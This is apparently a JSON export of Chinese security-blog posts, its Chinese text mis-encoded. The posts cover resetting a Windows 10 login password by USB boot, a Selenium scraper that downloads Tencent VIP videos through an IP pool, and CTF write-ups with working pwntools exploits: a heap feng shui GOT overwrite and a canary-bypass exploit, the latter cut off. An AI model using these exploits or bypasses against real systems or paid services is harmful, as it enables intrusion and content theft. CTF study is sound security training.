[{"id":"b1f559f91ac0347fea74456e0580d181","title":"ç ´è§£windows10å¼€æœºå¯†ç ","content":"\n\n\n\n\n\n\n\n\nåˆ©ç”¨Uç›˜ç ´è§£windows10çš„å¼€æœºå¯†ç \nç®€ä»‹æˆ‘ä»¬å¹³å¸¸ç”¨çš„windows10çš„å¼€æœºå¯†ç ä¼šä¿å­˜åœ¨ç³»ç»Ÿçš„ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œåªè¦ä¿®æ”¹å¯¹åº”æ–‡ä»¶é‡Œé¢å­˜å‚¨çš„å¯†ç å°±å¯ä»¥ç ´è§£win10çš„å¼€æœºå¯†ç \n\nä¸è¿‡ï¼Œè¿™ä¸ªæ–‡ä»¶æ­£å¸¸æƒ…å†µä¸‹æ˜¯æ— æ³•æ‰“å¼€çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨Uç›˜å¯åŠ¨æ¥ä¿®æ”¹å®ƒï¼Œè¿™é‡Œæˆ‘ç”¨è™šæ‹Ÿæœºæ¼”ç¤ºï¼ˆç‰©ç†æœºæ“ä½œæ–¹æ³•å·®ä¸å¤šï¼‰\nå®æ“å…³é—­è™šæ‹Ÿæœºï¼Œæ‰“å¼€ç¼–è¾‘ï¼Œé€‰æ‹©ç¡¬ç›˜ç‚¹å‡»æ·»åŠ \n\nä¸‹ä¸€æ­¥\n\né€‰æ‹©ç¬¬äºŒé¡¹ï¼Œä¸‹ä¸€æ­¥\n\né€‰æ‹©ç¬¬ä¸‰é¡¹ï¼Œä¸‹ä¸€æ­¥\n\næ’å…¥åˆ¶ä½œå¥½çš„Uç›˜ï¼Œé€‰æ‹©é‚£ä¸ªUç›˜ï¼Œé»˜è®¤æ˜¯æœ€åä¸€ä¸ªå› ä¸ºæ˜¯æŒ‰é¡ºåºæ’çš„ï¼ŒUç›˜æ˜¯æœ€åæ’å…¥çš„æ‰€ä»¥æ˜¯æœ€åä¸€ä¸ª\n\næœ€åç‚¹å®Œæˆå°±å¯ä»¥ï¼Œä¹‹ååœ¨å¼€æœºæ—¶é€‰æ‹©è¿›å…¥å›ºä»¶\n\né€‰æ‹©Uç›˜å¯åŠ¨ï¼ˆé»˜è®¤æ˜¯æœ€åä¸€ä¸ªï¼‰\n\né€‰æ‹©ç¬¬ä¸€ä¸ª\n\nè¿›å…¥ä»¥åæ‰¾åˆ°ç”¨æˆ·åä¿®æ”¹å¯†ç ä¿å­˜å³å¯\n\né‡å¯ä»¥åå°±ä¼šå‘ç°å¯†ç è¢«ä¿®æ”¹æˆè‡ªå·±åˆšåˆšè®¾ç½®çš„\n","slug":"ç ´è§£windows10å¼€æœºå¯†ç ","date":"2022-03-11T00:56:57.000Z","categories_index":"","tags_index":"å­¦ä¹ ","author_index":"Krito"},{"id":"5069ff540e4994664021502c262e84cf","title":"çˆ¬å–è…¾è®¯è§†é¢‘","content":"å‰è¨€æœ€è¿‘åœ¨è…¾è®¯è§†é¢‘çœ‹ã€Šå¼€ç«¯ã€‹ï¼Œæƒ³ç€æŠŠè§†é¢‘æä¸‹æ¥é¡ºä¾¿å­¦ä¸€ä¸‹çˆ¬è™«ï¼Œç½‘ä¸Šçœ‹äº†ä¸€äº›èµ„æ–™ï¼Œæœ€åä¹Ÿçˆ¬å–æˆåŠŸäº†ã€‚ä»¥ä¸‹æ˜¯æˆ‘çˆ¬å–è…¾è®¯è§†é¢‘è§†é¢‘çš„è¿‡ç¨‹ï¼Œè¿™é‡Œæ‹¿ã€Šå¼€ç«¯ã€‹ä¸¾ä¾‹ã€‚\nåˆ›å»ºIPæ± ä¸ºäº†é˜²æ­¢IPè¢«banå…ˆå»ºç«‹å¥½IPæ± \n\næ¨¡æ‹Ÿç™»é™†\n\n\n\n\n\n\n\n\nåœ¨ä¸€äº›è§†é¢‘ç½‘ç«™ä¸Šçœ‹ç”µå½±å¯èƒ½ä¸éœ€è¦ç™»é™†ç›´æ¥å¯ä»¥çœ‹ï¼Œä½†æ˜¯è…¾è®¯è§†é¢‘çœ‹VIPè§†é¢‘ä¸€å®šè¦ç™»é™†ï¼Œæ‰€ä»¥éœ€è¦å…ˆè¿›è¡Œæ¨¡æ‹Ÿç™»é™†ã€‚\nè¾“å…¥ç½‘å€åä¼šå¼¹å‡ºéœ€è¦ç™»é™†çš„å¼¹çª—ï¼Œç‚¹å‡»ä¹‹åå°±æ˜¯å¸¸è§„çš„ç™»å…¥æ­¥éª¤\n\nè¿™é‡Œå¯ä»¥é‡‡å–seleniumè¿›è¡Œæ¨¡æ‹Ÿç™»å…¥ï¼Œå¯»æ‰¾ç›¸åº”å…ƒç´ å¹¶ç‚¹å‡»ï¼Œä¸çŸ¥é“ä»€ä¹ˆåŸå› é‡‡å–xpathè·¯å¾„å¯»æ‰¾ä¼šæ‰¾ä¸åˆ°ï¼Œæ‰€ä»¥é‡‡å–cssè¡¨è¾¾å¼è¿›è¡Œå¯»æ‰¾\n\n123wd.find_element_by_css_selector(&#x27;div[class=&quot;action mt_15&quot;]&#x27;).click()  # ç‚¹å‡»ç™»é™†æŒ‰é’®wd.find_element_by_class_name(&quot;un-selected&quot;).click()  # å‹¾é€‰æœåŠ¡wd.find_elements_by_css_selector(&#x27;span[class=&quot;type-icon&quot;]&#x27;)[0].click()  # é€‰æ‹©qqç™»é™†\n\nä¹‹åé€‰æ‹©qqçš„ç™»å½•æ–¹å¼æ—¶ï¼Œè´¦å·å¯†ç ç™»å½•æ¡†æ¶è¢«åµŒå¥—ä¸¤æ¬¡ï¼Œéœ€è¦è¿›è¡Œè·³è½¬åˆ°å¯¹åº”æ¡†æ¶æ‰èƒ½è·å–å¯¹åº”å…ƒç´ \n\n12345678wd.switch_to.frame(&quot;_login_frame_quick_&quot;)  # è¿›å…¥ç™»é™†æ¡†æ¶wd.switch_to.frame(&quot;ptlogin_iframe&quot;)wd.find_element_by_id(&#x27;switcher_plogin&#x27;).click() # é€‰æ‹©ç™»é™†æ–¹å¼account = wd.find_element_by_id(&#x27;u&#x27;)  # è´¦å·account.send_keys(account)pd = wd.find_element_by_id(&#x27;p&#x27;)  # å¯†ç pd.send_keys(password)wd.find_element_by_css_selector(&#x27;a[class=&quot;login_button&quot;]&#x27;).click()  # ç™»é™†\n\nè·å–m3u8è…¾è®¯è§†é¢‘å’Œå¸¸è§„æ’­æ”¾ä¸€æ ·æ˜¯ä½¿ç”¨m3u8æ ¼å¼çš„tsæµè¿›è¡Œæ’­æ”¾ï¼Œåªè¦èƒ½å¤Ÿæˆªå–åˆ°tsç‰‡æ®µè¿›è¡Œåˆæˆå°±å¯ä»¥è·å¾—æ•´ä¸ªè§†é¢‘ï¼Œè€Œtsé“¾æ¥å­˜å‚¨åœ¨m3u8ä¸­ï¼Œéœ€è¦å…ˆè·å–m3u8æ–‡ä»¶\nè…¾è®¯è§†é¢‘çš„m3u8æ–‡ä»¶æ˜¯éšè—çš„ï¼Œé€šè¿‡å¼€å‘è€…æ¨¡å¼å¯»æ‰¾æ¯”è¾ƒè´¹æ—¶ã€‚ä½†æ˜¯è…¾è®¯è§†é¢‘å°è£…åœ¨windowå…¨å±€å¯¹è±¡ä¸‹è¾¹ï¼Œå¯ä»¥é€šè¿‡jså¿«é€Ÿè·å–ï¼Œé¿å…å¤§é‡å¯»æ‰¾\n\né€šè¿‡seleniumæ‰§è¡Œjså³å¯è·å¾—m3u8çš„ä¸‹è½½åœ°å€ä»è€Œè·å–m3u8\n\n12345678def get_m3u8(txt):    r = requests.get(txt,timeout=5,proxies=proxy)    with open(&#x27;movies.txt&#x27;,&#x27;wb&#x27;) as f:        f.write(r.content)wd.execute_script(&#x27;alert(PLAYER._DownloadMonitor.context.dataset.currentVideoUrl);&#x27;)m3u8 = wd.switch_to.alert.textget_m3u8(m3u8)\n\nè·å–tsç‰‡æ®µæ‰“å¼€m3u8æ–‡ä»¶å‘ç°é‡Œé¢tsç‰‡æ®µçš„åœ°å€æ˜¯ä¸å…¨çš„ï¼Œç¼ºå°‘å‰åŠéƒ¨åˆ†ï¼Œé€šè¿‡éªŒè¯å‘ç°ç¼ºå°‘çš„å‰åŠéƒ¨åˆ†é“¾æ¥æ¯æ¬¡åˆ·æ–°è§†é¢‘åä¼šæ›´æ”¹ï¼Œå¹¶ä¸æ˜¯å›ºå®šçš„æ‰€ä»¥è¿˜æ˜¯éœ€è¦è·å–ï¼Œç»è¿‡éªŒè¯å‘ç°ç¼ºå°‘çš„é“¾æ¥åŒ…å«åœ¨m3u8é“¾æ¥é‡Œé¢ï¼Œæ‰€ä»¥tsç‰‡æ®µå®Œæ•´é“¾æ¥=m3u8çš„éƒ¨åˆ†é“¾æ¥+m3u8é‡Œé¢è®°è½½çš„tsé“¾æ¥\n12345678910111213141516def get_ts(n):    with open(&quot;movies/&quot; + str(n)+&#x27;.ts&#x27;, &#x27;wb&#x27;) as f:        try:            r = requests.get(main_url+urls[n], timeout=5 ,proxies=proxy)            r.raise_for_status()            f.write(r.content)            if flag == 1:                failure_list.remove(n)        except:            if n not in failure_list:                failure_list.append(n)main_url = &#x27;/&#x27;.join(m3u8.split(&#x27;/&#x27;)[0:-1])+&#x27;/&#x27;urls = get_ts_url()  # å­˜å‚¨tsé“¾æ¥for i in tqdm(ts_list, desc=&quot;æ­£åœ¨è·å–ç‰‡æ®µï¼š&quot;):    get_ts(i,proxies=proxy,timeout=5)\n\næ‹¼æ¥æ£€æŸ¥æ¯ä¸ªtsç‰‡æ®µæ˜¯å¦å¼‚å¸¸ï¼Œå½“æ‰€æœ‰ç‰‡æ®µæ˜¯æ­£å¸¸çš„åè¿›è¡Œæ‹¼æ¥ï¼Œä»è€Œè·å–åˆ°è§†é¢‘\n123456789101112131415161718192021# åˆæˆtsç‰‡æ®µdef get_video():    files = [str(i)+&#x27;.ts&#x27; for i in range(len(os.listdir(&quot;movies/&quot;)))]    if os.path.exists(&quot;movies.mp4&quot;):        os.remove(&quot;movies.mp4&quot;)    for file in tqdm(files, desc=&quot;æ­£åœ¨è½¬æ¢è§†é¢‘æ ¼å¼ï¼š&quot;):        if os.path.exists(&quot;movies/&quot; + file):            with open(&quot;movies/&quot; + file, &#x27;rb&#x27;) as f1:                with open(&quot;movies.mp4&quot;, &#x27;ab&#x27;) as f2:                    f2.write(f1.read())        else:            print(&quot;å¤±è´¥&quot;)            # æ£€æŸ¥æ˜¯å¦ç‰‡æ®µæ˜¯å¦å®Œå¥½def check_ts():    while failure_list:        print(&quot;å¼‚å¸¸ç‰‡æ®µï¼š&quot;)        print(failure_list)        for i in failure_list:            get_ts(i)    get_video()\n\nè¡¥å……seleniumä¼šåœ¨ç»ˆç«¯æ˜¾ç¤ºæ—¥å¿—ï¼Œå¯¼è‡´è¿›åº¦æ¡é‡å¤å‡ºç°ï¼Œè¿™é‡Œå…³æ‰æ—¥å¿—æ˜¾ç¤º\n123options = webdriver.ChromeOptions()options.add_experimental_option(&#x27;excludeSwitches&#x27;, [&#x27;enable-logging&#x27;])wd = webdriver.Chrome(chrome_options=options)\n\nçˆ¬å–å®Œåå‘ç°ï¼Œè¿™æ ·çˆ¬å–çš„è§†é¢‘æ¸…æ™°åº¦åº¦æ˜¯é»˜è®¤çš„ï¼Œä¸æ˜¯é«˜æ¸…çš„ã€‚åŒæ—¶ï¼Œåˆ‡æ¢æ¸…æ™°åº¦çš„æŒ‰é’®æ˜¯éšè—çš„ï¼Œå¦‚æœé€šè¿‡å…ƒç´ å¯»æ‰¾ç›´æ¥ç‚¹å‡»ä¼šæŠ¥é”™ï¼Œä½†æ˜¯å°†é¼ æ ‡æ”¾åœ¨è§†é¢‘çª—å£ä¸Šå°±å¯ä»¥æ˜¾ç¤ºæ¸…æ™°åº¦æŒ‰é’®ï¼Œè¿›è€Œç‚¹å‡»åˆ‡æ¢æ¸…æ™°åº¦\n12345# åˆ‡æ¢æ¸…æ™°åº¦video = wd.find_element_by_css_selector(&#x27;txpdiv[class=&quot;txp_shadow&quot;]&#x27;)ActionChains(wd).move_to_element(video).perform()  # æ§åˆ¶é¼ æ ‡ç§»åŠ¨åˆ°è§†é¢‘ä½ç½®wd.find_elements_by_css_selector(&#x27;txpdiv[class=&quot;txp_label&quot;]&#x27;)[1].click()wd.find_element_by_css_selector(&#x27;txpdiv[data-role=&quot;txp-ui-control-definition-list&quot;] txpdiv:nth-of-type(2)&#x27;).click()  # é€‰æ‹©å¯¹åº”æ¸…æ™°åº¦\n\n\næ€»ç»“è·å–tsç‰‡æ®µæ—¶é‡‡ç”¨requestsèƒ½å¤Ÿå¿«é€Ÿè·å–ï¼Œè€Œåœ¨æ¨¡æ‹Ÿç™»é™†å’Œè·å–m3u8ä¸Šé‡‡å–seleniumæ¯”è¾ƒæµªè´¹æ—¶é—´ï¼Œæ•ˆç‡ä¸é«˜ï¼Œä¹‹åçœ‹çœ‹èƒ½ä¸èƒ½é‡‡ç”¨requestsä»£æ›¿seleniumå®ç°å¿«é€Ÿçˆ¬å–ã€‚å¯èƒ½æ˜¯åçˆ¬æœºåˆ¶ï¼Œå°è¯•é‡‡å–å¤šçº¿ç¨‹ç›´æ¥æ‹’ç»è®¿é—®äº†ï¼Œæ‰€ä»¥åªèƒ½é‡‡å–å•çº¿ç¨‹ï¼Œåç»­çœ‹çœ‹èƒ½ä¸èƒ½é€šè¿‡å…¶ä»–æ–¹å¼åŠ å¿«è·å–é€Ÿåº¦ã€‚\n","slug":"çˆ¬å–è…¾è®¯è§†é¢‘","date":"2022-01-24T14:06:18.000Z","categories_index":"","tags_index":"æ„Ÿæƒ³","author_index":"Krito"},{"id":"f86621641a641a4d6db180a8f81d528f","title":"å †é£æ°´ä¸å †æ’å¸ƒ","content":"ä»‹ç»æ‰€è°“å †é£æ°´ä¹Ÿå«ä½œå †æ’å¸ƒï¼Œå…¶å®è¯´ä¸¥æ ¼äº†å¹¶ä¸æ˜¯ä¸€ç§æ¼æ´çš„åˆ©ç”¨æ–¹æ³•ï¼Œè€Œæ˜¯ä¸€ç§çµæ´»å¸ƒç½®å †å—æ¥æ§åˆ¶å †å¸ƒå±€çš„æ–¹æ³•ï¼Œåœ¨ä¸€äº›å…¶ä»–æ¼æ´çš„åˆ©ç”¨ä¸­èµ·åˆ°æ•ˆæœã€‚æ¥ä¸‹æ¥æ‹¿ç”±æ¸…åè“è²èŠ±æˆ˜é˜Ÿå‡ºçš„babyfengshuiæ¥è®²ä¸€ä¸‹ã€‚\nbabyfengshuiåˆ†ææ£€æŸ¥ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œ32ä½ï¼Œæ²¡æœ‰å¼€pieä¿æŠ¤\n\næ¥ä¸‹æ¥å°±æ˜¯é™æ€åˆ†æï¼ŒåŠŸèƒ½åŒ…æ‹¬å¢åˆ æ”¹æŸ¥\n\nå…¶ä¸­åœ¨addé‡Œé¢ï¼Œæ¯æ¬¡ç”³è¯·éƒ½ä¼šå‡ºç°ä¸¤ä¸ªå †å—\n\n\næ¼æ´ç»§ç»­çœ‹updateå‡½æ•°ï¼Œè¿™é‡Œæœ‰ä¸ªåˆ¤æ–­ï¼Œå¦‚æœè¦è¾“å…¥çš„å¤§å°åŠ ä¸Šdescriptionçš„åœ°å€å¤§äºç­‰äºnameå †å—çš„åœ°å€å°±æŠ¥é”™ï¼Œè¿™é‡Œname_ptr[a1]-4çš„ä½ç½®æ˜¯chunkçš„presizeå¤„\nç”¨å›¾æ¥è§£é‡Šï¼Œå°±æ˜¯è¾“å…¥çš„descriptionæˆ–è€…ä¿®æ”¹çš„descriptionçš„é•¿åº¦ä¸èƒ½è¾¾åˆ°å›¾ä¸­çº¢çº¿å¤„\nåˆçœ‹èµ·æ¥æ²¡ä»€ä¹ˆæ¯›ç—…ï¼Œä½†æ˜¯å¦‚æœè¿™ä¸¤ä¸ªå †å—æ²¡æœ‰è¿ç»­ï¼Œå°±ä¼šé€ æˆä¸¤ä¸ªå †å—ä¸­é—´å¯ä»¥éšæ„ä¿®æ”¹\n\nå¦‚æœä¸è¿ç»­ï¼ŒåŒæ—¶ä¸­é—´æ˜¯ä¸€ä¸ªchunkï¼Œå°±ä¼šå¯¼è‡´ä¸­é—´çš„chunkå¯ä»¥è¢«éšæ„ä¿®æ”¹\né€ æˆè¿™ä¸¤ä¸ªå †å—ä¸è¿ç»­æ‰€åˆ©ç”¨çš„æ–¹æ³•å°±æ˜¯å †é£æ°´ï¼Œé€šè¿‡çµæ´»å¸ƒç½®å †å—æ¥æ§åˆ¶å †å¸ƒå±€ï¼Œæ¥ä¸‹æ¥è®²è§£å¦‚ä½•å°†ä¸¤ä¸ªå †å—åˆ†å¼€\nåˆ©ç”¨é¦–å…ˆç”³è¯·ä¸¤ä¸ªå †å—ï¼Œä¹‹ådeleteç¬¬ä¸€ä¸ªchunk\n123add(0x40,&#39;aaaa&#39;,0x40,&#39;aaaa&#39;)#idx0add(0x20,&#39;bbbb&#39;,0x20,&#39;bbbb&#39;)#idx1delete(0)\n\nç”±äºunlinkæœºåˆ¶æ‰€ä»¥ä¼šå°†0x40å’Œ0x80æ•´åˆèµ·æ¥ï¼Œå¦‚æœæˆ‘ä»¬ç”³è¯·ä¸€ä¸ªå¤§å°å¤§äº0x40chunkï¼Œé‚£ä¹ˆè¯¥chunkä¼šåœ¨åŸæ¥ç¬¬ä¸€ä¸ªchunkä½ç½®ï¼Œä½†æ˜¯ç”±äºå‰©ä½™çš„chunkå¤§å°ä¼šå°äº0x80ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´åŸæœ¬ç›¸é‚»çš„chunkä¼šè¢«åˆ†å¼€\n\nè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹chunk2æ¥ä¿®æ”¹åˆ°chunk1ï¼Œæ§åˆ¶chunk1æŒ‡å‘free_gotï¼Œå†show(1)è·å–freeå‡½æ•°åœ°å€ï¼Œä»è€Œå¾—åˆ°systemå‡½æ•°\n1234567891011add(0x80,&#39;&#x2F;bin&#x2F;sh\\x00&#39;,0x80,&#39;&#x2F;bin&#x2F;sh\\x00&#39;)#idx3 ä¹‹åç”¨äºsystem(&#39;&#x2F;bin&#x2F;sh&#39;)payload1 &#x3D; &#39;a&#39;*0x54+p32(0x79)+&#39;a&#39;*0x74+p32(0x28)+&#39;a&#39;*0x24+p32(0x89)+p32(elf.got[&#39;free&#39;]) # ä¿®æ”¹chunk1edit(2,0x100,payload1) # å› ä¸ºchunk2æŒ‡å‘çš„chunkåœ¨chunk1å‰é¢ï¼Œæ‰€ä»¥é€šè¿‡chunk2ä¿®æ”¹chunk1æŒ‡å‘free_gotå‡½æ•°show(1)p.recvuntil(&#39;description: &#39;)free_addr&#x3D;int(u32(p.recv(4)))print hex(free_addr)libc&#x3D;ELF(&#39;libc-2.23.so&#39;)libc_base&#x3D;free_addr-libc.sym[&quot;free&quot;]system_addr&#x3D;libc_base+libc.sym[&quot;system&quot;]\n\nè¿™é‡Œæ³¨æ„ä¸€ç‚¹chunk3å¤§å°è¦å¤§äº0x70ï¼Œä¸ç„¶ä¼šç”³è¯·åˆ°ä¹‹å‰freeçš„chunkä¸­ï¼Œè¿™æ ·ä¼šå¯¼è‡´ä¿®æ”¹chunk1æ—¶è¦†ç›–åˆ°chunk3\nå› ä¸ºchunk1è¢«ä¿®æ”¹åˆ°æŒ‡å‘free_gotï¼Œæ‰€ä»¥ç»§ç»­ç¼–è¾‘chunk1ï¼Œè¿™æ ·å°±å¯ä»¥ä¿®æ”¹free-&gt;systemï¼Œfree(chunk3)-&gt;system(â€˜/bin/shâ€™)\nEXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *from LibcSearcher import LibcSearcher#p = remote(&#x27;node4.buuoj.cn&#x27;,25824)p = process(&#x27;./babyfengshui_33c3_2016&#x27;)elf = ELF(&#x27;./babyfengshui_33c3_2016&#x27;)ptr_addr = 0x804B080def add(desp_size,desp_content,text_size,text_content):\tp.sendlineafter(&#x27;: &#x27;,&#x27;0&#x27;)\tp.sendlineafter(&#x27;description: &#x27;,str(desp_size))\tp.sendlineafter(&#x27;name: &#x27;,desp_content)\tp.sendlineafter(&#x27;text length: &#x27;,str(text_size))\tp.sendlineafter(&#x27;text: &#x27;,str(text_content))def delete(idx):\tp.sendlineafter(&#x27;: &#x27;,&#x27;1&#x27;)\tp.sendlineafter(&#x27;index: &#x27;,str(idx))def show(idx):\tp.sendlineafter(&#x27;: &#x27;,&#x27;2&#x27;)\tp.sendlineafter(&#x27;index: &#x27;,str(idx))def edit(idx,text_size,text_content):\tp.sendlineafter(&#x27;: &#x27;,&#x27;3&#x27;)\tp.sendlineafter(&#x27;index: &#x27;,str(idx))\tp.sendlineafter(&#x27;text length: &#x27;,str(text_size))\tp.sendlineafter(&#x27;text: &#x27;,str(text_content))add(0x40,&#x27;aaaa&#x27;,0x40,&#x27;aaaa&#x27;)#idx0add(0x20,&#x27;bbbb&#x27;,0x20,&#x27;bbbb&#x27;)#idx1delete(0)add(0x50,&#x27;cccc&#x27;,0x50,&#x27;cccc&#x27;)#idx2gdb.attach(p)add(0x80,&#x27;/bin/sh\\x00&#x27;,0x80,&#x27;/bin/sh\\x00&#x27;)#idx3payload1 = &#x27;a&#x27;*0x54+p32(0x79)+&#x27;a&#x27;*0x74+p32(0x28)+&#x27;a&#x27;*0x24+p32(0x89)+p32(elf.got[&#x27;free&#x27;])edit(2,0x100,payload1)show(1)p.recvuntil(&#x27;description: &#x27;)free_addr=int(u32(p.recv(4)))print hex(free_addr)libc=ELF(&#x27;libc-2.23.so&#x27;)libc_base=free_addr-libc.sym[&quot;free&quot;]system_addr=libc_base+libc.sym[&quot;system&quot;]edit(1,4,p32(system_addr))delete(3)p.interactive()\n\n","slug":"å †é£æ°´ä¸å †æ’å¸ƒ","date":"2022-01-14T01:50:00.000Z","categories_index":"pwn","tags_index":"ç¬”è®°","author_index":"Krito"},{"id":"3c52b98d7c3f3c00c8108b428bc990ce","title":"ç»•è¿‡canaryçš„å…­ç§æ–¹æ³•","content":"æ–‡ç« é¦–å‘äºå®‰å…¨å®¢\nç®€ä»‹canaryä¿æŠ¤åˆç§°é‡‘ä¸é›€ä¿æŠ¤ï¼Œä½œç”¨æ˜¯ä¸ºäº†é˜²æ­¢æ ˆæº¢å‡ºçš„ä¸€ç§ä¿æŠ¤æœºåˆ¶ã€‚å·¥ä½œåŸç†æ˜¯ä»fs/gså¯„å­˜å™¨å–å€¼æ”¾åœ¨rbp-4æˆ–è€…rbp-8çš„ä½ç½®ï¼ˆ32ä½/64ä½ï¼‰ï¼Œå½“ç”¨æˆ·è¾“å…¥ç»“æŸåï¼Œç¨‹åºä¼šä»rbp-4æˆ–è€…rbp-8çš„ä½ç½®å–å‡ºå¹¶ä¸fs/gså¯„å­˜å™¨å¯¹åº”ä½ç½®çš„å€¼è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœä¸ç›¸ç­‰å°±ä¼šæ‰§è¡Œ__ stack_chk_failå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¼ºè¡Œåœæ­¢ç¨‹åºè¿è¡Œå¹¶å‘å‡ºè­¦å‘Šï¼Œä»è€Œé˜»æ­¢æ ˆæº¢å‡ºæ”»å‡»ã€‚å½“ç„¶ï¼Œè¿™ç§ä¿æŠ¤å¹¶ä¸æ˜¯ä¸‡æ— ä¸€å¤±çš„ï¼Œä¸‹é¢æˆ‘å°†ä¼šåˆ—ä¸¾å‡º6ç§ç»•è¿‡canaryçš„æ–¹æ³•ï¼Œæ¯ç§æ–¹æ³•å¤šå°‘éƒ½æœ‰ä¸€å®šçš„é™åˆ¶ï¼Œå…·ä½“è¿˜æ˜¯è¦ä¾æ®é¢˜ç›®æ¥å†³å®šé‡‡ç”¨ä½•ç§æ–¹æ³•ã€‚\nä¸‹é¢åˆ—ä¸¾ä¸€ä¸ª64ä½ä¸‹çš„canaryä¿æŠ¤è¿è¡Œæœºåˆ¶ï¼š\nç¨‹åºå¼€å¯canaryä¿æŠ¤åï¼Œåœ¨è¿è¡Œå¼€å§‹ä¼šä»fså¯„å­˜å™¨åç§»ä¸º0x28çš„ä½ç½®ä¸­å–å‡º8å­—èŠ‚æ”¾å…¥raxå¯„å­˜å™¨ä¸­ï¼Œä¹‹åraxä¼šå°†å…¶æ”¾åœ¨rbp-8çš„ä½ç½®ï¼Œæœ€åå°†raxçš„å€¼æ¸…é›¶\n\nç¨‹åºæ¥æ”¶æˆ‘ä»¬çš„è¾“å…¥åä¼šè¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœcanaryè¢«è¦†ç›–å°±ä¼šæ‰§è¡Œstack_chk_failå‡½æ•°ä»è€Œé˜»æ­¢ç¨‹åºç»§ç»­è¿è¡Œ\n\n\nleakç»•è¿‡é€šè¿‡æ³„éœ²canaryæ¥ç»•è¿‡canaryï¼Œå¸¸è§çš„æœ‰è¦†ç›–æ‰å‰é¢çš„\\x00è®©è¾“å‡ºå‡½æ•°æ³„éœ²ï¼Œè¿˜æœ‰printfå®šç‚¹æ³„éœ²ã€‚\nstackguard1ä¸€ä¸ªç®€å•çš„64ä½canaryä¿æŠ¤ç¨‹åºï¼Œgdbè°ƒè¯•å¯ä»¥çœ‹åˆ°ä¸€å¼€å§‹ç¨‹åºä¼šä»fså¯„å­˜å™¨å¯¹åº”çš„åç§»å¤„å–å€¼æ”¾å…¥raxä¸­ï¼Œraxä¼šæ”¾å…¥rbp-8çš„ä½ç½®ï¼Œæœ€åæ¸…é›¶eax\n\nç¨‹åºè¿è¡Œåˆ°å¿«ç»“æŸæ—¶ï¼Œä¼šæ£€æŸ¥canaryï¼Œé¦–å…ˆå°†canaryå–å‡ºåˆ°rcxï¼Œrcxä¼šå’Œfså¯„å­˜å™¨å¯¹åº”çš„åç§»å¤„å–å‡ºè¿›è¡Œæ¯”è¾ƒï¼Œä¸åŒå°±ä¼šè·³è½¬åˆ°__stack_chk_fail@pltä½ç½®ï¼Œå¼ºè¡Œç»“æŸè¿›ç¨‹å¹¶å¼¹å‡ºè­¦å‘Š\n\nåˆ†ææ ˆç»“æ„ï¼šç¼“å†²åŒºè¿‡åå°±æ˜¯canaryï¼Œæ‰€ä»¥å¦‚æœæ˜¯ç®€å•çš„æº¢å‡ºè¦†ç›–è¿”å›åœ°å€å°±ä¼šè¦†ç›–åˆ°canaryï¼Œä»è€Œå¯¼è‡´ç¨‹åºå´©æºƒã€‚å› æ­¤ï¼Œå¦‚æœè¦åˆ©ç”¨æ ˆæº¢å‡ºå°±ä¸€å®šè¦ç»•è¿‡canaryã€‚æ‰€ä»¥æ€è·¯å°±æ˜¯å…ˆé€šè¿‡è¾“å‡ºå‡½æ•°æ³„éœ²canaryçš„å€¼ï¼Œä¹‹ååœ¨è¦†ç›–æ—¶ç”¨æ³„éœ²çš„canaryå€¼è¦†ç›–canaryï¼Œå…¶å®ƒçš„å°±è¦†ç›–æˆæˆ‘ä»¬æƒ³è¦çš„ï¼Œè¿™æ ·å°±ç»•è¿‡äº†canaryã€‚\n\né€šè¿‡å­—ç¬¦ä¸²åˆ—è¡¨æ‰¾åˆ°bin/shï¼Œæ‰¾åˆ°è°ƒç”¨çš„ä½ç½®ï¼Œå‘ç°å‡½æ•°canary_protect_meå‡½æ•°é‡Œé¢ä¼šè°ƒç”¨è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªåé—¨å‡½æ•°è·å–åˆ°shell\n\nç»§ç»­åˆ†æï¼Œç¨‹åºå­˜åœ¨ä¸¤æ¬¡è¾“å…¥ï¼Œä¸€æ¬¡getsè¾“å…¥ï¼Œä¸€æ¬¡readè¾“å…¥ï¼Œä¸­é—´å­˜åœ¨printfå‡½æ•°ï¼Œå¯ä»¥å¯¹ä»»æ„åœ°å€è¿›è¡Œæ³„éœ²\n\næ¥ä¸‹æ¥readè¯»å–æ—¶ï¼Œå…è®¸è¯»å–çš„0x60ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯åœ¨0x28å¤„å°±é‡åˆ°canaryï¼Œ0x38å°±æ˜¯è¿”å›åœ°å€ï¼Œæ˜æ˜¾å­˜åœ¨æ ˆæº¢å‡º\n\n\næ‰€ä»¥æ€è·¯åŸºæœ¬å°±æ˜¯ï¼Œå…ˆåˆ©ç”¨ç¬¬ä¸€æ¬¡è¾“å…¥æ³„éœ²canaryï¼Œåœ¨ç¬¬äºŒæ¬¡è¾“å…¥æ—¶ç»•è¿‡canaryå¹¶ä¿®æ”¹è¿”å›åœ°å€åˆ°back_door\nå› ä¸ºæ˜¯getså‡½æ•°æœ€åä¼šè¡¥ä¸Š\\x00ï¼Œä¼šç»ˆæ­¢printfè¯»å–ï¼Œæ‰€ä»¥æ— æ³•é€šè¿‡è¦†ç›–æ³„éœ²ï¼Œä½†å› ä¸ºæ˜¯printfè¾“å‡ºï¼Œæ‰€ä»¥å¯ä»¥é‡‡å–æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²canary\nè·å–gadget\n\nEXP12345678910111213141516from pwn import *context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;back_door = 0x4011d6&quot;&quot;&quot; ROPgadget --binary stackguard1 --only &quot;&quot;&quot;pop|ret&quot;|grep &quot;rdi&quot; &quot;&quot;&quot;pop_rdi_ret = 0x0401343bin_sh = 0x402004#p = process(&#x27;./stackguard1&#x27;)p = remote(&#x27;123.57.230.48&#x27;,12344)payload1 = &#x27;%11$p&#x27;  # æ³„éœ²canaryp.sendline(payload1)canary=int(p.recv(),16)  # æ¥å—canaryprint 